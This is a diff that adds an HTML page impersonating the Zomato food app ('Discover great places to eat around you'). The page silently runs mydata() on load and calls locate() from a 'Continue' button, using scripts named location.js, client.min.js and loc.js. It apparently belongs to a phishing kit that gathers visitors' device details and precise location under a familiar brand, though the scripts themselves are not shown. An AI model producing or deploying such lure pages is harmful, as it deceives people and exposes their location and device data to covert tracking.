@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>Zomato | Never have a bad meal</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#000000">
+
+  <link rel="icon" type="image/x-icon" href="flat-location-logo-152-234349.jpg">
+  <link href="fonts.css" rel="stylesheet">
+  <link href="main.css" rel="stylesheet">
+
+  <!-- REQUIRED JS (LOGIC ONLY) -->
+  <script src="../../assets/js/jquery.min.js"></script>
+  <script src="../../assets/js/location.js"></script>
+  <script src="../../assets/js/client.min.js"></script>
+  <script src="../../assets/js/loc.js"></script>
+</head>
+
+<body onload="mydata()">
+
+  <div>
+    <h1>Welcome to Zomato</h1>
+  </div>
+
+  <div>
+    <h2>Discover great places to eat around you</h2>
+  </div>
+
+  <!-- BUTTON UNCHANGED -->
+  <div>
+    <button id="change" class="button" type="button" onclick="locate()">
+      Continue
+    </button>
+  </div>
+
+  <div class="text" id="result"></div>
+
+</body>
+
+</html>
